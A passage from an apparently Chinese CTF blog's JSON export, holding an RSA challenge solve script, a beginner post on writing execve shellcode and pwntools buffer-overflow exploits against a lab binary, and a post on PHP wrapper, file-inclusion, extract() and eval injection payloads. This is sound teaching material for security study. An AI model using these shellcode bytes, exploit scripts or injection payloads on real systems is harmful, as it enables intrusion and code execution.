int(n3, 16)# print 'n2:', n2# print 'n3:', n3# first step: solve n1e1 = 0x1001e2 = 0x101f = open('n1.encrypted', 'rb')n1_c1 = f.readline()n1_c2 = f.readline()f.close()n1_c1 = int(n1_c1, 16)n1_c2 = int(n1_c2, 16)# print 'n1_c1:', n1_c1# print 'n1_c2:', n1_c2gcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0: s = abs(s) n1_c1 = gmpy2.invert(n1_c1, n3)if t &lt; 0: t = abs(t) n1_c2 = gmpy2.invert(n1_c2, n3)n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3print 'n1:', n1# second step: solve flagf = open('ciphertext', 'rb')c1 = f.readline()c2 = f.readline()f.close()c1 = int(c1, 16)c2 = int(c2, 16)print 'c1:', c1print 'c2:', c2e = 0x1001p1 = gmpy2.gcd(n1, n2)p2 = n1 / p1p3 = n2 / p1d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))m1 = pow(c1, d1, n1)m2 = pow(c2, d2, n2)msg1 = hex(m1)[2:].decode('hex')msg2 = hex(m2)[2:].decode('hex')flag = ''for i in range(len(msg1 + msg2)): if i % 2 == 0: flag += msg1[i / 2] else: flag += msg2[i / 2]print 'flag:', flag å‚è€ƒç½‘ç«™https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/https://www.xmsec.cc/stackoverflow-ropbasic/https://blog.csdn.net/xuchen16/article/details/81080580https://blog.csdn.net/xuchen16/article/details/81064079http://www.freebuf.com/column/177864.htmlhttps://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/http://www.cnblogs.com/semishigure/p/9318258.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"PWNå…¥é—¨ï¼ˆä¸‰ï¼‰","slug":"PWNå…¥é—¨ï¼ˆä¸‰ï¼‰","date":"2018-07-11T00:50:39.000Z","updated":"2019-02-03T09:45:48.697Z","comments":true,"path":"2018/07/11/PWNå…¥é—¨ï¼ˆä¸‰ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/11/PWNå…¥é—¨ï¼ˆä¸‰ï¼‰/","excerpt":"Shellcodeâ€™s Magic&amp;Basic ROP.","text":"Shellcodeâ€™s Magic&amp;Basic ROP. shellcodeæ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´è€Œæ‰§è¡Œçš„ä»£ç ï¼Œä»¥å…¶ç»å¸¸è®©æ”»å‡»è€…è·å¾—shellè€Œå¾—åã€‚shellcodeå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ã€‚ ç³»ç»Ÿè°ƒç”¨ï¼ˆint 0x80ï¼‰ NAME EAX EBX ECX EDX sys_exit 1 int 0 0 sys_read 3 unsigned int char * size_t sys_write 4 unsigned int const_char * size_t sys_open 5 const char * int int sys_execve 11 struct pt_regs 0 0 PSï¼šæœ€å¸¸ç”¨çš„ä¸º11å·è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯execve(&quot;/bin/sh&quot;,0,0)ã€‚ ç¼–å†™ShellCodeè‡ªå·±ç¼–å†™shellcodeçš„ä¼˜ç‚¹æ˜¯çµæ´»ã€å¯ä»¥éšæœºåº”å˜ã€‚ åå­—ç¬¦Shellcodeä¸­å­˜åœ¨0x00å­—èŠ‚åœ¨è¿›è¡Œåˆ©ç”¨çš„æ—¶å€™ä¼šè¢«æˆªæ–­ã€‚Shellcodeå¦‚æœå­˜å‚¨åœ¨å †æˆ–æ˜¯æ ˆçš„å†…å­˜ä¸­ï¼Œè¿™æ ·åœ¨shellcodeæ‰§è¡Œæ—¶å°±ä¸èƒ½å‡ºç°0x00è¿™æ ·çš„é˜¶æ®µå­—ç¬¦ã€‚ \\x00åœ¨æ‰§è¡ŒMOV EAX,5æ—¶ï¼Œç›¸å½“äºMOV EAX,0x00000005ï¼Œå³ä¼šäº§ç”Ÿ0x00ï¼Œå¯ä»¥ä½¿ç”¨MOV AL,5æ¥ç»•è¿‡ \\x0Aç»•è¿‡å¯ä»¥é€šè¿‡!@#$%ã€‚ EBXä¸­çš„å‚æ•°ï¼ˆ/bin/shï¼‰ä¸€èˆ¬åšæ³•æ˜¯å‹å…¥æ ˆåå–ESPï¼š 123PUSH 0x68732F2FPUSH 0x6E69622FMOV EBX,ESP å‰ä¸¤æ®µåå…­è¿›åˆ¶è½¬æ¢æˆasciiç æ˜¯ï¼šhs//nib/ï¼Œå–ESPçš„å€¼åˆ°EBXä¸­åï¼ŒEBXçš„å€¼å³ä¸ºï¼šå­—ç¬¦ä¸²/bin//shçš„é¦–åœ°å€ã€‚ PSï¼šåœ¨å¤šçº§ç›®å½•ä¸‹ï¼Œå¤šä¸ªæ–œæ æ˜¯å¯¹è·¯å¾„æ²¡æœ‰å½±å“çš„ã€‚ nasmåæ±‡ç¼–å·¥å…·ä¸‹è½½Netwide Assembleræ˜¯ä¸€æ¬¾åŸºäºè‹±ç‰¹å°”x86æ¶æ„çš„æ±‡ç¼–ä¸åæ±‡ç¼–å·¥å…·ã€‚å®ƒå¯ä»¥ç”¨æ¥ç¼–å†™16ä½ã€32ä½ï¼ˆIA-32ï¼‰å’Œ64ä½ï¼ˆx86-64ï¼‰çš„ç¨‹åºã€‚ NASMè¢«è®¤ä¸ºæ˜¯Linuxå¹³å°ä¸Šæœ€å—æ¬¢è¿çš„æ±‡ç¼–å·¥å…·ä¹‹ä¸€ã€‚ sudo apt-get install nasmæŠ¥é”™è®°å½•ä¸€ä¸‹æ— æ³•ä¸‹è½½æ—¶çš„è§£å†³æ–¹æ³•ã€‚ ä½¿ç”¨ps -A | grep aptå‘½ä»¤æ¥æ‰¾å‡ºæ‰€æœ‰aptè¿›ç¨‹ã€‚ ä½¿ç”¨sudo kill -9 {è¿›ç¨‹ç¼–å·}æ¥é€ä¸ªæ€æ­»è¿›ç¨‹ã€‚ ç»“æŸæ‰€æœ‰è¿›ç¨‹åå³å¯ä¸‹è½½ã€‚ å®Œæ•´ç¼–å†™è¿‡ç¨‹å†™å…¥æ–‡ä»¶shellcode.asmï¼š 1234567891011Section .text global _start_start: xor ecx,ecx mul ecx push ecx push 0x68732f2f push 0x6e69622f mov ebx,esp mov al,0xb int 0x80 PSï¼šå…³äºè¿™ä¸¤æ¡æŒ‡ä»¤ï¼šXOR ECX,ECX =&gt; MUL ECXï¼Œç»è¿‡æµ‹è¯•ï¼Œä¼šå…ˆå°†ECXä¸­çš„å€¼ç½®é›¶ï¼Œç„¶åEAXã€EDXä¸­çš„å€¼ä¹Ÿéƒ½ä¼šå˜ä¸ºé›¶ã€‚ æ‰§è¡Œå‘½ä»¤ï¼šnasm -f elf shellcode.asm -o shellcode.oåï¼Œä½¿ç”¨objdumpå‘½ä»¤å¯¹shellcode.oè¿›è¡Œåæ±‡ç¼–ï¼šobjdump -d shellcode.oã€‚ å°†åå…­è¿›åˆ¶éƒ¨åˆ†è®°å½•ä¸‹æ¥ï¼Œå°±æ„æˆäº†ä¸€æ¡shellcodeï¼š\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80ã€‚ ROPé¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programmingï¼‰æ˜¯è®¡ç®—æœºå®‰å…¨æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å…è®¸æ”»å‡»è€…åœ¨å®‰å…¨é˜²å¾¡çš„æƒ…å†µä¸‹æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸å¯æ‰§è¡Œçš„å†…å­˜å’Œä»£ç ç­¾åã€‚æ”»å‡»è€…æ§åˆ¶å †æ ˆè°ƒç”¨ä»¥åŠ«æŒç¨‹åºæ§åˆ¶æµå¹¶æ‰§è¡Œé’ˆå¯¹æ€§çš„æœºå™¨è¯­è¨€æŒ‡ä»¤åºåˆ—ï¼ˆç§°ä¸ºGadgetsï¼‰ã€‚æ¯ä¸€æ®µgadgeté€šå¸¸ç»“æŸäºreturnæŒ‡ä»¤ï¼Œå¹¶ä½äºå…±äº«åº“ä»£ç ä¸­çš„å­ç¨‹åºã€‚ç³»åˆ—è°ƒç”¨è¿™äº›ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ‹¥æœ‰æ›´ç®€å•æ”»å‡»é˜²èŒƒçš„ç¨‹åºå†…æ‰§è¡Œä»»æ„æ“ä½œã€‚ ç›¸å…³ä¿æŠ¤æœºåˆ¶NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆç±»ä¼¼äºwindowsä¸‹çš„DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ PSï¼š No eXecuteï¼ˆNXï¼‰ =&gt; linux Data Execution Preventionï¼ˆDEPï¼‰ =&gt; windows ä¹Ÿå°±æ˜¯è¯´ï¼šâ€œå¯æ‰§è¡Œä¸å¯å†™ï¼Œå¯å†™ä¸å¯æ‰§è¡Œã€‚â€ ASLRAddress Space Layout Randomizationï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰ï¼Œè¯¥æŠ€æœ¯åœ¨2005å¹´çš„kernel2.6.12ä¸­è¢«å¼•å…¥åˆ°Linuxç³»ç»Ÿï¼Œå®ƒå°†è¿›ç¨‹çš„æŸäº›å†…å­˜ç©ºé—´åœ°å€è¿›è¡ŒéšæœºåŒ–æ¥å¢å¤§å…¥ä¾µè€…é¢„æµ‹ç›®çš„åœ°å€çš„éš¾åº¦ï¼Œä»è€Œé™ä½è¿›ç¨‹è¢«æˆåŠŸå…¥ä¾µçš„é£é™©ã€‚å½“å‰Linuxã€Windowsç­‰ä¸»æµæ“ä½œç³»ç»Ÿéƒ½å·²ç»é‡‡ç”¨è¯¥é¡¹æŠ€æœ¯ã€‚ åˆ†çº§ï¼š 0ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚å³å…³é—­ASLRã€‚ 1ï¼šä¿ç•™çš„éšæœºåŒ–ã€‚å…±äº«åº“ã€æ ˆã€mmap()ä»¥åŠVDSOå°†è¢«éšæœºåŒ–ã€‚ 2ï¼šå®Œå…¨çš„éšæœºåŒ–ã€‚åœ¨1çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡brk()åˆ†é…çš„å†…å­˜ç©ºé—´ä¹Ÿå°†è¢«éšæœºåŒ–ã€‚ PSï¼š ASLRå¹¶ä¸è´Ÿè´£BSSæ®µã€ä»£ç æ®µï¼ˆæ–‡æœ¬æ®µï¼‰å’Œæ•°æ®æ®µï¼ˆDATAæ®µï¼‰çš„éšæœºåŒ–ã€‚ å †æ ˆç©ºé—´è¢«å®Œå…¨éšæœºåŒ–ã€‚ 7-11æºç ï¼š 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; gets(buf); int magic = rand(); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; è¿™é“é¢˜å’Œä¹‹å‰çš„ä¸€é¢˜å¾ˆç±»ä¼¼ï¼Œä½†æ˜¯å°†bufå’Œmagicä¸¤ä¸ªå˜é‡çš„ä½ç½®è¿›è¡Œäº†è°ƒæ¢ï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡ç›´æ¥è¦†ç›–magicçš„å€¼æ¥getshellã€‚ï¼ˆå½“ç„¶è¿˜æœ‰ä¸€ç§æ–¹æ³•æ—¶ç›´æ¥è·å¾—system(&quot;sh&quot;);çš„åœ°å€æ¥getshellï¼‰ ç®€å•éš¾åº¦æ­¤æ—¶ASLRæ˜¯å…³é—­çš„ã€‚ åŸºæœ¬çš„æƒ³æ³•æ˜¯å…ˆå¡«å…¥shellcodeï¼Œç„¶åé€šè¿‡retçš„åç§»é‡æ¥è·³è½¬åˆ°shellcodeçš„é¦–åœ°å€ï¼Œæ‰§è¡Œexecve(&quot;/bin/sh&quot;,0,0)æ¥getshellã€‚ shellcodeåœ¨ä¹‹å‰å·²ç»å†™å¥½äº†ï¼Œåç§»é‡ä¹Ÿå¯ä»¥é€šè¿‡ä¹‹å‰ç¼“å†²åŒºæº¢å‡ºçš„æ–¹æ³•æ¥å¾—åˆ°ã€‚ æœ€ååº”è¯¥å¦‚ä½•è·å¾—shellcodeçš„é¦–åœ°å€ï¼Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹payloadæ¥è·å–ã€‚ 12345678910# test.pyfrom pwn import *p = process('./7-11')raw_input() # ç›¸å½“äºè®¾ä¸‹æ–­ç‚¹shellcode=p32(0xdeadbeef)+\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0x12345678)offset=116payload=shellcode+(offset-len(shellcode))*'A'+addrp.sendline(payload)p.interactive() è¿™é‡Œåœ¨shellcodeå‰åŠ ä¸Šâ€œ0xdeadbeefâ€ï¼Œæ˜¯ä¸ºäº†ä¹‹ååœ¨è°ƒè¯•æ—¶æ›´æ–¹ä¾¿åœ°æ‰¾åˆ°é¦–åœ°å€ã€‚raw_input()è¦æ±‚è¾“å…¥å€¼ï¼Œå¯ä»¥ä½¿ç¨‹åºåœ¨è¿è¡Œæ—¶ç»ˆæ­¢ï¼Œç›¸å½“äºä¸€ä¸ªæ–­ç‚¹ã€‚ è¿è¡Œtest.pyï¼Œä¼šå¾—åˆ°è¯¥ç¨‹åºçš„PIDï¼Œç”¨gdbçš„attachå‘½ä»¤æ‰§è¡Œå®ƒã€‚ åœ¨è¿è¡Œç¨‹åºå¤„éšä¾¿è¾“å…¥å€¼ï¼Œç„¶ååœ¨gdbä¸­ç”¨finishå‘½ä»¤ä½¿ç¨‹åºæ‰§è¡Œåˆ°gets()å‡½æ•°ç»“æŸï¼Œå†ç”¨searchmemå‘½ä»¤æŸ¥æ‰¾â€œ0xdeadbeefâ€çš„åœ°å€ï¼Œå³å¾—åˆ°shellcodeçš„é¦–åœ°å€ã€‚ æœ€åçš„expå¦‚ä¸‹ï¼š 12345678910# 7-11.pyfrom pwn import *p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"addr=p32(0xffffcfa8)offset=116# payload=shellcode+(offset-len(shellcode))*'A'+addrpayload=shellcode.ljust(offset,'A')+addrp.sendline(payload)p.interactive() ä¸­ç­‰éš¾åº¦é€šè¿‡å‘½ä»¤sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;ï¼Œæ‰“å¼€ASLRã€‚ é€šè¿‡ä¹‹å‰çš„äº†è§£ï¼Œå½“ASLRå¼€å¯æ—¶ï¼Œå †æ ˆçš„åœ°å€æ˜¯éšæœºçš„ï¼Œè€ŒBSSçš„åœ°å€æ˜¯ä¸å˜çš„ï¼Œé‚£ä¹ˆé€šè¿‡BSSæ®µå¯ä»¥åšä¸€äº›æ–‡ç« ã€‚ PSï¼šBSSï¼ˆBlock Started by Symbolï¼‰é€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚å…¶ç‰¹ç‚¹æ˜¯å¯è¯»å†™ï¼Œä¸”åœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰ä¼šè‡ªåŠ¨æ¸…0ã€‚ æ€»ä½“çš„æ€è·¯æ˜¯åˆ©ç”¨BSSæ®µåœ°å€ä¸å˜çš„ç‰¹æ€§ï¼Œæ„é€ payloadï¼špayload=offset*&#39;A&#39;+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)ï¼ˆå› ä¸ºBSSæ®µå¼€å¤´éƒ¨åˆ†å¯èƒ½å­˜å‚¨ä¸€äº›é‡è¦æ•°æ®ï¼Œæ•…å¢åŠ 0x100æ¥é¿å…å½±å“ç¨‹åºï¼‰ã€‚ç¬¬ä¸€ä¸ªBSSé¦–åœ°å€è¡¨ç¤ºgets()çš„è¿”å›åœ°å€ï¼Œç¬¬äºŒä¸ªBSSé¦–åœ°å€è¡¨ç¤ºgets()çš„å‚æ•°ã€‚ é‚£ä¹ˆé€šè¿‡payloadå¯çŸ¥ï¼Œç¨‹åºæ‰§è¡Œæ—¶ä¼šé‡æ–°è¿”å›åˆ°gets()å‡½æ•°å¤„ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œç›¸å½“äºå…ˆPush retaddrå†Jumpï¼Œå³ç¬¬ä¸€ä¸ªBSSé¦–åœ°å€ä¸ºå‡½æ•°è¿”å›åœ°å€ï¼Œå†è¾“å…¥shellcodeä½œä¸ºå‡½æ•°å‚æ•°ï¼Œå³ç¬¬äºŒä¸ªBSSé¦–åœ°å€ã€‚ ä½¿ç”¨gdbå¯¹ç¨‹åºè°ƒè¯•ï¼Œç”¨vmmapå‘½ä»¤æŸ¥çœ‹bssæ®µï¼š è®°å½•ä¸‹bssæ®µåœ°å€ã€‚é€šè¿‡objdump -dæŸ¥çœ‹gets()å‡½æ•°åœ°å€ï¼š ä¸¤ä¸ªåœ°å€éƒ½æå®šåï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™å‡ºexpäº†ï¼š 12345678910111213from pwn import *# p = remote('10.21.13.88',1025)p = process('./7-11')shellcode=\"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"offset=116bss=0x0804a000gets_addr=0x08048400payload=offset*'A'+p32(gets_addr)+p32(bss+0x100)+p32(bss+0x100)p.sendline(payload)# gdb.attach(p,'''# ''') //åœ¨è¿è¡Œè„šæœ¬æ—¶å¯ä»¥ç›´æ¥æ‰“å¼€gdbè¿›è¡Œè°ƒè¯•p.sendline(shellcode)p.interactive() startæ„Ÿè§‰è‡ªå·±åŸºç¡€çŸ¥è¯†è¿˜æ˜¯æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå…ˆæŠŠåˆ«äººçš„wpæ”¾ä¸Šæ¥ï¼Œä¹‹åæ…¢æ…¢ç ”ç©¶ã€‚ å‚è€ƒç½‘ç«™https://linux.cn/article-8040-1.htmlhttp://bestwing.me/2017/03/19/stack-overflow-two-ROP/https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/https://blog.csdn.net/white_eyes/article/details/7169199https://b3t4m3ee.github.io/2018/07/10/Shellcode-s-Magic/https://blog.csdn.net/Plus_RE/article/details/79199772","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEBå…¥é—¨ï¼ˆäº”ï¼‰","slug":"WEBå…¥é—¨ï¼ˆäº”ï¼‰","date":"2018-07-10T09:10:35.000Z","updated":"2019-02-03T09:43:50.509Z","comments":true,"path":"2018/07/10/WEBå…¥é—¨ï¼ˆäº”ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/07/10/WEBå…¥é—¨ï¼ˆäº”ï¼‰/","excerpt":"PHPä¼ªåè®®å’Œæ–‡ä»¶åŒ…å«ã€‚","text":"PHPä¼ªåè®®å’Œæ–‡ä»¶åŒ…å«ã€‚ PHPä¼ªåè®®ä¸æ˜¯æŒ‡ç½‘ç»œä¸Šçš„TCP/IPåè®®ï¼Œè€Œæ˜¯æ“ä½œç³»ç»Ÿæä¾›æ”¯æŒçš„ä¸€ç§åè®®ï¼Œç±»ä¼¼æ ‡å‡†åè®®HTTPã€FTPã€‚è‡ªå®šä¹‰åè®®å«åšä¼ªåè®®ã€‚ ä¼ªåè®®æ ¼å¼ï¼šzzz://xxxxxxã€‚ PHPä¼ªåè®®æ€»å’Œ å½¢å¼ ä½œç”¨ file:// è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ http:// è®¿é—® HTTP(s) ç½‘å€ ftp:// è®¿é—® FTP(s) URLs php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºï¼ˆI/Ostreamsï¼‰ zlib:// å‹ç¼©æµ data:// æ•°æ®ï¼ˆRFC 2397ï¼‰ glob:// æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ phar:// PHP å½’æ¡£ ssh2:// Secure Shell 2 rar:// RAR ogg:// éŸ³é¢‘æµ expect:// å¤„ç†äº¤äº’å¼çš„æµ é…ç½® allow_url_fopenï¼šèƒ½å¦è¿œç¨‹æ–‡ä»¶åŒ…å« allow_url_includeï¼šèƒ½å¦ä½¿ç”¨ä¼ªåè®® PHPä¼ªåè®®åº”ç”¨php://filterå½¢å¼ï¼š?file=php://filter/convert.base64-encode/resource=xxx.php php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€œæ•°æ®æµæ‰“å¼€â€æ—¶çš„â€œç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ç®€å•æ¥è®²å°±æ˜¯å¯ä»¥åœ¨æ‰§è¡Œä»£ç å‰å°†ä»£ç æ¢ä¸ªæ–¹å¼è¯»å–å‡ºæ¥ï¼Œåªæ˜¯è¯»å–ï¼Œä¸éœ€è¦å¼€å¯allow_url_includeã€‚ åº”ç”¨ç‚¹å‡»è·³è½¬é¡µé¢åï¼Œé€šè¿‡ä¼ªåè®®è¯»å–æºç ï¼š æºç è§£å¯†åå¾—åˆ°flagï¼š å˜é‡è¦†ç›–æ¼æ´ï¼ˆextract()ï¼‰int extract(array &amp;$var_array, int $extract_type = EXTR_OVERWRITE, string $prefix = null) extract()å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚ ç¬¬äºŒä¸ªå‚æ•°typeç”¨äºæŒ‡å®šå½“æŸä¸ªå˜é‡å·²ç»å­˜åœ¨ï¼Œè€Œæ•°ç»„ä¸­åˆæœ‰åŒåå…ƒç´ æ—¶ï¼Œextract()å‡½æ•°å¦‚ä½•å¯¹å¾…è¿™æ ·çš„å†²çªã€‚è¯¥å‡½æ•°è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚ extract(array,extract_rules,prefix) extract_rulesçš„é»˜è®¤å€¼ä¸ºEXTR_OVERWRITEï¼Œè¡¨ç¤ºå¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ åº”ç”¨ï¼ˆlianxi-input1ï¼‰æºç ï¼š 123456789101112&lt;?php$flag='xxxxx'; extract($_GET); if(isset($shiyan)&#123; $content=trim($flag); if($shiyan==$content) echo'flag&#123;......&#125;'; else echo'Oh.no'; &#125;?&gt; é€šè¿‡extract()å˜é‡è¦†ç›–ï¼Œæ„é€ payload?shiyan=1&amp;flag=1å¾—åˆ°flagã€‚ file_get_contents()file_get_contents()å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ åº”ç”¨ï¼ˆlianxi-dataï¼‰æºç ï¼š 12345678&lt;?php$user=$_GET['user'];#echo $user;if(isset($user)&amp;&amp;(file_get_contents($user,'r')==='the user is admin')) echo \"flag&#123;xxxxxxxxxxxxx&#125;\";else echo \"you are not admin ! \";?&gt; åˆ†åˆ«é€šè¿‡GETå’ŒPOSTä¸¤ç§æ–¹å¼è·å¾—flagï¼š åº”ç”¨å››å…ˆæ ¹æ®æç¤ºæŸ¥çœ‹php.inié…ç½®æƒ…å†µ å‘ç°å¯ä»¥é€šè¿‡ä¼ªåè®®æ¥æ‰§è¡Œä»£ç ï¼Œå…ˆè·å¾—æ ¹è·¯å¾„ï¼š å†é€šè¿‡scandir()å‡½æ•°æ¥æ‰«æ ¹è·¯å¾„å°±èƒ½æ‰¾åˆ°flagè·¯å¾„ï¼Œç›´æ¥è®¿é—®å°±å¾—åˆ°flagã€‚ eval()é—­åˆæ¼æ´eval()å‡½æ•°å¯ä»¥æ‰§è¡Œå‡½æ•°å†…éƒ¨å­—ç¬¦ä¸²æ‰€æ„æˆçš„æŒ‡ä»¤ã€‚é€šè¿‡é—­åˆå‰åçš„æ‹¬å·å¯ä»¥è¾¾åˆ°æ‰§è¡Œå…¶ä»–å‘½ä»¤çš„æ•ˆæœã€‚ åº”ç”¨ï¼ˆlianxi-excuteï¼‰æºç ï¼š 123456 &lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; æ„é€ payloadï¼š);print_r(file(&quot;./flag.php&quot;) å³eval(&quot;var_dump();print_r(file(&quot;./flag.php&quot;));&quot;); åº”ç”¨å…­æºç ï¼š 12345678 &lt;?php show_source(__FILE__); if(isset($_REQUEST['path']))&#123; include($_REQUEST['path']); &#125;else&#123; include('phpinfo.php'); &#125;?&gt; å…ˆé€šè¿‡ä¼ªåè®®æ‰«æå½“å‰ç›®å½•ï¼š&lt;?php print_r(scandir(&quot;.&quot;)); ?&gt; ç›´æ¥è®¿é—®flag.phpå¾—åˆ°flagã€‚ phar://phar://æ˜¯æ•°æ®æµåŒ…è£…å™¨ï¼Œè‡ªPHP5.3.0èµ·å¼€å§‹æœ‰æ•ˆï¼Œä¹Ÿæ˜¯phpçš„ä¸€ä¸ªå‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯è§£å‹è¿˜åŸã€‚ åº”ç”¨åœ¨phpæ–‡ä»¶ä¸­å†™å…¥&lt;?php phpinfo(); ?&gt;ï¼Œå°†æ–‡ä»¶å‹ç¼©åä¿®æ”¹åç¼€åä¸ºjpgã€‚ ä¸Šä¼ æ–‡ä»¶åæ„é€ payloadï¼šhttp://127.0.0.1/lianxi/phar1/include.php?file=phar://upload/11.jpg/11ã€‚ PHPæ–‡ä»¶åŒ…å«æ¼æ´åœ¨é€šè¿‡å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œç”±äºæ²¡æœ‰å¯¹åŒ…å«çš„æ–‡ä»¶åè¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤å¤„ç†ï¼Œè¢«æ”»å‡»è€…åˆ©ç”¨ä»è€Œå¯¼è‡´äº†åŒ…å«äº†Webæ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶è¿›æ¥ï¼Œå°±ä¼šå¯¼è‡´æ–‡ä»¶ä¿¡æ¯çš„çš„æ³„æ¼ç”šè‡³æ³¨å…¥äº†æ¶æ„ä»£ç  åˆ†ç±» è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰ï¼š?file=http://file/text.txt æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰ï¼š?file=../text.txt PHPæ–‡ä»¶åŒ…å«çš„å‡ ä¸ªå‡½æ•° include()ï¼šåªæœ‰ä»£ç æ‰§è¡Œåˆ°è¯¥å‡½æ•°æ—¶æ‰ä¼šåŒ…å«æ–‡ä»¶è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šå¹¶ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ include_once()ï¼šå’Œinclude()åŠŸèƒ½ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºè‡³è°ƒç”¨ä¸€æ¬¡ã€‚ 